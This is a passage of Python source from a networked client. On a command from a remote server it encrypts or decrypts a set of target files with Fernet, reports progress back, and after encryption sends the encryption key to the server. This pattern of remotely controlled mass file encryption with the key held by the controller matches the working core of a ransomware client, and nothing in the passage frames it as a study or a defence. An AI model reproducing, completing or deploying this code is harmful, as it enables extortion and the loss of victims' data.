                 self.send_message(f"STATUS: No target files found for {mode}.\n")
                 return

            self.send_message(f"STATUS: Found {len(target_files)} files. Starting {mode} process...\n")

            # Process files
            for i, filepath in enumerate(target_files):
                 # Check if client is still running before processing next file
                 if not self.running:
                      client_logger.warning(f"Client stopped during {mode}. Aborting.")
                      self.send_message(f"STATUS: Operation aborted (client stopped).\n")
                      break

                 if mode == 'encrypt':
                      success, message = self._encrypt_file(fernet, filepath)
                 else: # decrypt
                      success, message = self._decrypt_file(fernet, filepath)

                 if success:
                      processed_count += 1
                 else:
                      error_count += 1

                 # Send periodic status updates (non-error messages)
                 current_time = time.time()
                 if success and (processed_count % status_interval == 0 or current_time - last_status_time > 10.0):
                      self.send_message(f"STATUS: ({processed_count}/{len(target_files)}) {message}\n")
                      last_status_time = current_time
                 elif not success: # Always send error messages immediately
                      self.send_message(f"STATUS: ({i+1}/{len(target_files)}) {message}\n")


            # Final Report
            end_time = time.time()
            duration = end_time - start_time
            final_msg = f"COMPLETED: {mode.capitalize()} finished in {duration:.2f}s. " \
                        f"Processed: {processed_count}, Errors: {error_count}.\n"
            client_logger.info(final_msg.strip())
            self.send_message(final_msg)

            # Send key again at the end for encryption for redundancy
            if mode == 'encrypt':
                 key_b64 = base64.urlsafe_b64encode(key_bytes).decode('utf-8')
                 self.send_message(f"KEY: {key_b64}\n") # Use distinct prefix for easy parsing

        except Exception as e:
            error_trace = traceback.format_exc()
            err_msg = f"FATAL ERROR during {mode}: {e}\nTrace:\n{error_trace}\n"
            client_logger.critical(err_msg)
            # Try to send fatal error back to server
            self.send_message(err_msg)

# --- Example Usage ---
if __name__ == "__main__":
    SERVER_HOST = "127.0.0.1"  # Server IP or hostname
    SERVER_PORT = 8000         # Server Port
    # Optional: Path to server.crt or CA cert bundle for verification
    # CERT_FILE = '../ssl_deets/server.crt'

    client_instance = Client(SERVER_HOST, SERVER_PORT)
    main_thread = threading.current_thread()
    main_thread.name = "ClientMainThread"

    try:
        # Start the client in the main thread. It will block until connection ends.
        client_instance.start_client()
    except KeyboardInterrupt:
        client_logger.info("Keyboard interrupt received. Stopping client...")
        # stop_client() will be called by the finally block in start_client
    except Exception as e:
         client_logger.critical(f"Unhandled exception in main execution block: {e}", exc_info=True)
    finally:
         # Ensure stop is called if start_client returns or raises non-KeyboardInterrupt
         if client_instance.running:
              client_logger.info("Ensuring client is stopped in main finally block...")
              client_instance.stop_client()

    client_logger.info("Client program finished.")
